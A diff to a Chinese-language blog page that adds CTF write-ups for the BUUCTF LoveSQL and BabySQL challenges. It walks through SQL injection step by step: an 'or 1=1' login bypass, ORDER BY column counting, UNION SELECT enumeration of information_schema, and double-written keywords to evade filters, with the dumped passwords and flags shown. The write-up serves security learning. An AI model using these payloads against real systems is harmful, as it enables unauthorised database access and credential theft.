@@ -146,7 +146,18 @@
 <meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/13.png">
 <meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/15.png">
 <meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/14.png">
-<meta property="og:updated_time" content="2022-12-07T03:18:56.192Z">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/16.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/17.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/18.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/19.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/20.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/21.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/22.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/23.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/24.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/25.png">
+<meta property="og:image" content="/2022/12/07/CTF-SQL-WriteUp/26.png">
+<meta property="og:updated_time" content="2022-12-08T08:48:32.276Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF SQL WriteUp">
 <meta name="twitter:description" content="前言Ctf sql注入学习 题目地址：https://buuoj.cn/challenges [强网杯 2019]随便注10x00启动靶机输入1，回显如下  输入1&amp;#39;，回显如下  输入1&amp;#39;#，回显如下  发现存在sql注入，进而使用order by爆列数 11&apos; order by 1;# 无报错  11&apos; order by 2;# 无报错  11&apos; order by 3;# 报错">
@@ -434,6 +445,68 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/12/07/CTF-SQL-WriteUp/14.png" alt="1"></p>
 <p>flag为<code>flag{e0fd544e-1ad2-4725-9a41-5de52bc11c9d}</code></p>
+<h3 id="极客大挑战-2019-LoveSQL1"><a href="#极客大挑战-2019-LoveSQL1" class="headerlink" title="[极客大挑战 2019]LoveSQL1"></a>[极客大挑战 2019]LoveSQL1</h3><h4 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h4><p>启动靶机，发现需要用户名密码登陆，直接万能密码尝试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' or '1'='1'<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/16.png" alt="16"></p>
+<h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>接着通过<code>order by</code>爆破列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin' order by 1<span class="comment">#</span></span><br><span class="line">admin' order by 2<span class="comment">#</span></span><br><span class="line">admin' order by 3<span class="comment">#</span></span><br><span class="line">admin' order by 4<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>4的时候报错，说明有3列</p>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/17.png" alt="17"></p>
+<p>回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/18.png" alt="18"></p>
+<h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>查询数据库和版本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/19.png" alt="19"></p>
+<p>查询数据库下的数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/20.png" alt="20"></p>
+<p>查询指定表名下的列名信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'geekuser'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/21.png" alt="21"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'l0ve1ysq1'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/22.png" alt="22"></p>
+<h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><p>查询指定数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>得到<code>flag</code>为<code>flag{b9c4667a-4a05-441b-b100-a2106627c639}</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;b9c4667a-4a05-441b-b100-a2106627c639&#125;'</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h3><h4 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h4><p>万能密码失效，对于一些sql关键字进行了过滤</p>
+<p>尝试双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>发现列数不匹配</p>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/23.png" alt="23"></p>
+<p>回显爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/24.png" alt="24"></p>
+<p>查询数据库下的数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>报错如下</p>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/25.png" alt="25"></p>
+<p>继续双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/07/CTF-SQL-WriteUp/26.png" alt="26"></p>
+<p>查询指定表名下的列名信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>上面两张表均没有flag的信息</p>
+<p>猜测存在其他数据库中</p>
+<h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><p>获取所有数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>得到的结果如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,test,ctf,geek</span><br></pre></td></tr></table></figure>
+<p>猜测<code>ctf</code>数据库中存在<code>flag</code></p>
+<p>查看<code>ctf</code>数据库中的所有表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>结果如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'Flag'</span><br></pre></td></tr></table></figure>
+<p>查询Flag表中的列名信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>结果如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag'</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><p>查询指定数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>结果如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag&#123;fa4954aa-49af-4e07-adc4-74a1260cbb21&#125;'</span><br></pre></td></tr></table></figure>
+<p><code>flag</code>为<code>flag{fa4954aa-49af-4e07-adc4-74a1260cbb21}</code></p>
 
       
     </div>
@@ -613,7 +686,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-随便注1"><span class="nav-number">2.</span> <span class="nav-text">[强网杯 2019]随便注1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00"><span class="nav-number">2.1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">2.2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02"><span class="nav-number">2.3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03"><span class="nav-number">2.4.</span> <span class="nav-text">0x03</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL1"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-随便注1"><span class="nav-number">2.</span> <span class="nav-text">[强网杯 2019]随便注1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00"><span class="nav-number">2.1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">2.2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02"><span class="nav-number">2.3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03"><span class="nav-number">2.4.</span> <span class="nav-text">0x03</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL1"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-LoveSQL1"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-1"><span class="nav-number">4.1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-1"><span class="nav-number">4.2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-1"><span class="nav-number">4.3.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-1"><span class="nav-number">4.4.</span> <span class="nav-text">0x03</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-BabySQL1"><span class="nav-number">5.</span> <span class="nav-text">[极客大挑战 2019]BabySQL1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-2"><span class="nav-number">5.1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-2"><span class="nav-number">5.2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-2"><span class="nav-number">5.3.</span> <span class="nav-text">0x02</span></a></li></ol></li></ol></div>
             
 
           </div>
